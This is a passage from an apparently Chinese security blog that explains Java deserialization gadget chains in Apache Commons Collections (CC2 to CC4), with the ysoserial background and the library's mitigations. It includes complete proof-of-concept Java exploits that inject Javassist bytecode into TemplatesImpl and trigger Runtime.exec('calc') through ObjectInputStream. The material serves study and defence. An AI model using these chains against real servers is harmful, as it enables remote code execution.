<span class="hljs-keyword">null</span>);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(newTransformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br>        Object[] queue_array =<span class="hljs-keyword">new</span> Object[] &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,queue_array);<br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;comparator&quot;</span>,transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之前提到<code>_tfactory</code>和<code>_class</code>因为<code>TransformerFactoryImpl</code>置为空以及<code>TemplatesImpl</code>会赋值<code>_class</code>，这里 poc 却不需要再设置其值，因为在触发到<code>TemplateImpl.newTransformer.TransformerImpl</code>会设置<code>_tfactory</code>值为<code>TransformerFactoryImpl _tfactory = null</code>，<code>_class</code>值则是<code>_class = new Class[classCount]=new Class[1]=null</code>，符合进入<code>defineTransletClasses</code>的条件</p><p>而<code>PriorityQueue</code>需要 add 两次(这里没有进行 add，而是通过反射直接设置<code>size</code>，因此不受其构造方法的<code>initialCapacity</code>传值影响)，并设置<code>comparator</code>为<code>TransformingComparator</code>实例对象才能成功调用，前面已经分析过了不再赘述</p><h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><h3 id="Pre-2"><a href="#Pre-2" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk1.7 &lt; 8u71</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>              <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                              TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                       <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-2"><a href="#关键类-2" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrAXFilter<br>Templates<br>TemplatesImpl<br>InstantiateTransformer <span class="hljs-regexp">//</span>替换InvokerTransformer<br><br>ClassPool<br>CtClass<br>AbstractTranslet<br><br>Transformer<br>ConstantTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure><p>CC3 是 CC1+CC2 的变种，CC2 使用了<code>TemplatesImpl.newTransformer</code>来触发命令执行；而 ysoserial 中 CC3 使用的是<code>TrAXFilter</code>类调用<code>newTransformer</code></p><h3 id="Gadget-2"><a href="#Gadget-2" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="①p-牛简化的链子"><a href="#①p-牛简化的链子" class="headerlink" title="①p 牛简化的链子"></a>①p 牛简化的链子</h4><blockquote><p>在 安全漫谈中记录了如下的结合方式，含 CC2 的<code>TemplateImpl</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>      <span class="hljs-keyword">method</span>.invoke<span class="hljs-literal">()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplateClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br></code></pre></td></tr></table></figure></blockquote><p>CC2 中，使用<code>TransformingComparator</code>去处理<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code></p><p>而 CC3，则改造了 CC1 的数组，<code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</code>改为<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code>去执行<code>TemplatesImpl.newTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC3;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Ezbyp</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates,&quot;_class&quot;,null);</span><br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>        &#125;);<br>        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazyMap);<br><br>        Map proxymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,  invocationHandler);<br>        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxymap);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(handler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="②TrAXFilter-InstantiateTransformer"><a href="#②TrAXFilter-InstantiateTransformer" class="headerlink" title="②TrAXFilter+InstantiateTransformer"></a>②TrAXFilter+InstantiateTransformer</h4><blockquote><p>ysoserial 的代码，会发现<code>CommonsCollections3</code>和上述代码并不同，没有使⽤到<code>InvokerTransformer</code>。原因是因为：2015 年初，@frohoff 和@gebl 发布了 Talk《Marshalling Pickles: how deserializing objects will ruin your day》，以及 Java 反序列化利⽤⼯具 ysoserial，随后引爆了安全界。</p><p>Apache Commons Collections 官⽅在 2015 年底得知序列化相关的问题后，就在两个分⽀ 上同时发布了新的版本，4.1 和 3.2.2。先看 3.2.2，通过 diff 可以发现，新版代码中增加了⼀个⽅法 FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置 org.apache.commons.collections.enableUnsafeSerialization=true ，即默认情况下会 抛出异常。 这个检查在常⻅的危险 Transformer 类（InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常。</p><p>同时，开发者们⾃然会去找寻⼀种安全的过滤⽅法，类似 SerialKiller 这样的⼯具随之诞⽣。 SerialKiller 是⼀个 Java 反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类。在<code>SerialKiller</code>中就有过滤<code>InvokerTransformer</code>。</p><p>针对此情况<code>ysoserial</code>的 CC3 用<code>InstantiateTransformer</code>替换<code>InvokerTransformer</code>，同时使用了<code>TrAXFilter</code></p></blockquote><p>下面介绍的是 ysoserial 中<code>TrAXFilter</code>类调用<code>newTransformer</code>的方式以及<code>InstantiateTransformer</code></p><h5 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h5><p><code>TrAXFilter</code>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">        TransformerConfigurationException</span><br><span class="hljs-function">    </span>&#123;<br>        _templates = templates;<br>        _transformer = (TransformerImpl) templates.newTransformer();<br>        _transformerHandler = <span class="hljs-keyword">new</span> TransformerHandlerImpl(_transformer);<br>        _useServicesMechanism = _transformer.useServicesMechnism();<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h5><p>chained 如何去触发<code>TrAXFilter</code>的构造方法进而调用<code>newTransformer</code>，CC3 用了一个<code>InstantiateTransformer</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (input <span class="hljs-keyword">instanceof</span> Class == <span class="hljs-keyword">false</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<br>                    <span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br>                        + (input == <span class="hljs-keyword">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>            &#125;<br>            Constructor con = ((Class) input).getConstructor(iParamTypes);<br>            <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>            ...<br></code></pre></td></tr></table></figure><p>这里把<code>input</code>设置<code>TrAXFilter</code>，那么就会在这里实例化的时候调用其构造方法，进而调用<code>TemplatesImpl#newTransformer</code>最后 RCE</p><p>如何调用到这个<code>chainedTransformer</code>是 CC2 中 LazyMap 中实现的，不再赘述~</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC3;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br><br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><span class="hljs-comment">//        setFieldValue(templatesimpl, &quot;_class&quot;, null);</span><br><span class="hljs-comment">//        setFieldValue(templatesimpl, &quot;_tfactory&quot; ,new TransformerFactoryImpl());</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap decorate = (LazyMap) LazyMap.decorate(hm, chainedTransformer);<br><br>        Constructor declaredConstructor = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorate);<br><br>        Map proxymap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<br>        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxymap);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(handler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><h3 id="Pre-3"><a href="#Pre-3" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 4.0</p></blockquote><h4 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span 